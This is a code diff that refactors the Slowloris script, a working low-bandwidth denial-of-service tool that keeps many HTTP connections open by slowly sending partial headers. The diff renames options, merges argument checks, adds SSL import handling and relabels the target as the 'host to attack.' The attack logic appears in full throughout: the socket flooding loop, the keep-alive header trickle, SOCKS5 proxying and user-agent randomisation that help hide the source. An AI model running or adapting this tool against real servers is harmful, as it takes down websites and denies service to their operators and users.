@@ -1,30 +1,35 @@
-import argparse
-import logging
-import random
-import socket
 import sys
 import time
+import random
+import socket
+import logging
+import argparse
 
+# Parameters Setting
 parser = argparse.ArgumentParser(
-    description="Slowloris, low bandwidth stress test tool for websites"
+    description="Slowloris, low bandwidth stress test tool for websites.",
 )
 parser.add_argument(
     "host",
     nargs="?",
-    help="Host to perform stress test on"
+    help="Target host to attack."
 )
 parser.add_argument(
     "-p",
     "--port",
+    dest="port",
+    metavar="",
     default=80,
-    help="Port of webserver, usually 80",
+    help="Port of webserver (default 80).",
     type=int
 )
 parser.add_argument(
     "-s",
     "--sockets",
+    dest="sockets",
+    metavar="",
     default=150,
-    help="Number of sockets to use in the test",
+    help="Number of sockets to create.",
     type=int,
 )
 parser.add_argument(
@@ -32,75 +37,72 @@ parser.add_argument(
     "--verbose",
     dest="verbose",
     action="store_true",
-    help="Increases logging",
+    help="Show more information in the log.",
 )
 parser.add_argument(
     "-ua",
-    "--randuseragents",
+    "--user-agent",
     dest="randuseragent",
     action="store_true",
-    help="Randomizes user-agents with each request",
-)
-parser.add_argument(
-    "-x",
-    "--useproxy",
-    dest="useproxy",
-    action="store_true",
-    help="Use a SOCKS5 proxy for connecting",
-)
-parser.add_argument(
-    "--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host"
-)
-parser.add_argument(
-    "--proxy-port", default="8080", help="SOCKS5 proxy port", type=int
+    help="Randomizes user-agents with each request.",
 )
 parser.add_argument(
     "--https",
     dest="https",
     action="store_true",
-    help="Use HTTPS for the requests",
+    help="Use HTTPS for the requests.",
+)
+parser.add_argument(
+    "--use-proxy",
+    dest="useproxy",
+    action="store_true",
+    help="Use a SOCKS5 proxy for connecting.",
 )
 parser.add_argument(
     "--sleeptime",
     dest="sleeptime",
+    metavar="",
     default=15,
     type=int,
     help="Time to sleep between each header sent.",
 )
-parser.set_defaults(verbose=False)
-parser.set_defaults(randuseragent=False)
-parser.set_defaults(useproxy=False)
-parser.set_defaults(https=False)
+parser.add_argument(
+    "--proxy-host",
+    dest="proxy_host",
+    metavar="",
+    default="127.0.0.1",
+    help="SOCKS5 proxy host."
+)
+parser.add_argument(
+    "--proxy-port",
+    dest="proxy_port",
+    metavar="",
+    default=8080,
+    help="SOCKS5 proxy port.",
+    type=int
+)
+
 args = parser.parse_args()
 
-if len(sys.argv) <= 1:
-    parser.print_help()
-    sys.exit(1)
-
-if not args.host:
-    print("Host required!")
+if len(sys.argv) <= 1 or not args.host:
+    # Check if parameters and host are setted.
     parser.print_help()
     sys.exit(1)
 
 if args.useproxy:
-    # Tries to import to external "socks" library
-    # and monkey patches socket.socket to connect over
-    # the proxy by default
     try:
+        logging.info("Importing socks module...")
         import socks
-
-        socks.setdefaultproxy(
-            socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port
-        )
+        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port)
         socket.socket = socks.socksocket
         logging.info("Using SOCKS5 proxy for connecting...")
     except ImportError:
-        logging.error("Socks Proxy Library Not Available!")
+        logging.error("Socks Proxy Library Is Not Available!")
         sys.exit(1)
 
 logging.basicConfig(
     format="[%(asctime)s] %(message)s",
-    datefmt="%d-%m-%Y %H:%M:%S",
+    datefmt="%Y-%m-%d %H:%M:%S",
     level=logging.DEBUG if args.verbose else logging.INFO,
 )
 
@@ -112,11 +114,15 @@ def send_header(self, name, value):
     self.send_line(f"{name}: {value}")
 
 if args.https:
-    logging.info("Importing ssl module")
-    import ssl
+    try:
+        logging.info("Importing ssl module...")
+        import ssl
 
-    setattr(ssl.SSLSocket, "send_line", send_line)
-    setattr(ssl.SSLSocket, "send_header", send_header)
+        setattr(ssl.SSLSocket, "send_line", send_line)
+        setattr(ssl.SSLSocket, "send_header", send_header)
+    except ImportError:
+        logging.error("SSL Library Is Not Available!")
+        sys.exit(1)
 
 list_of_sockets = []
 user_agents = [
@@ -176,26 +182,22 @@ def slowloris_iteration():
     logging.info("Sending keep-alive headers...")
     logging.info("Socket count: %s", len(list_of_sockets))
 
-    # Try to send a header line to each socket
+    # Try to send a header line to each socket.
     for s in list(list_of_sockets):
-        try:
-            s.send_header("X-a", random.randint(1, 5000))
-        except socket.error:
-            list_of_sockets.remove(s)
+        try: s.send_header("X-a", random.randint(1, 5000))
+        except socket.error: list_of_sockets.remove(s)
 
     # Some of the sockets may have been closed due to errors or timeouts.
     # Re-create new sockets to replace them until we reach the desired number.
-
     diff = args.sockets - len(list_of_sockets)
-    if diff <= 0:
-        return
+    if diff <= 0: return
 
     logging.info("Creating %s new sockets...", diff)
+
     for _ in range(diff):
         try:
             s = init_socket(args.host)
-            if not s:
-                continue
+            if not s: continue
             list_of_sockets.append(s)
         except socket.error as e:
             logging.debug("Failed to create new socket: %s", e)
@@ -209,11 +211,12 @@ def main():
     logging.info("Creating sockets...")
     for _ in range(socket_count):
         try:
-            logging.debug("Creating socket nr %s", _)
+            logging.debug("Creating socket nr %s...", _)
             s = init_socket(ip)
         except socket.error as e:
             logging.debug(e)
             break
+
         list_of_sockets.append(s)
 
     while True:
@@ -224,7 +227,8 @@ def main():
             break
         except Exception as e:
             logging.debug("Error in Slowloris iteration: %s", e)
-        logging.debug("Sleeping for %d seconds", args.sleeptime)
+
+        logging.debug("Sleeping for %d seconds...", args.sleeptime)
         time.sleep(args.sleeptime)
 
 if __name__ == "__main__":
